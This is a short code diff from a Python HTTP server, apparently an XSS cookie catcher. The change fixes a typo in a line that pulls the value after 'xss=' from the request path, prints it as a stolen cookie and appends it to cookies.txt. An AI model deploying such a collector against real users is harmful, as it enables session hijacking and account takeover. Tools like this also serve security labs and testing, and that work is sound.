@@ -45,7 +45,7 @@ class S(http.server.BaseHTTPRequestHandler):
   def do_GET(self):  
     self._set_headers()  
     print(self.path)  
-    cookie =s elf.path.split("xss=")[1]  
+    cookie = self.path.split("xss=")[1]  
     print("Cookie: "+cookie+"\n")
     
     with open('cookies.txt', 'a') as xss:  
